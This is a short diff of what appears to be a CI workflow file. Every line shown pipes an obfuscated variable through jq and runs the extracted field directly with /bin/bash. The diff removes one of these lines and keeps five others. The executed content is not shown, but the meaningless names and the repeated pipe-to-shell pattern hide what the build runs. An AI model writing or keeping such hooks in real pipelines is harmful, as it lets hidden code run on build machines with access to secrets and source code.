@@ -23,7 +23,6 @@ jobs:
           echo $nfz99 | jq -r .pv8 | /bin/bash
           echo $xyq8125 | jq -r .u688 | /bin/bash
           printf '%s' "$q2" | jq -r .w042 | /bin/bash
-          echo $x2 | jq -r .xypbz82624 | /bin/bash
           printf '%s' "$pqvb71589" | jq -r .qlz948 | /bin/bash
           printf '%s' "$dijim90" | jq -r .dimx7 | /bin/bash
 
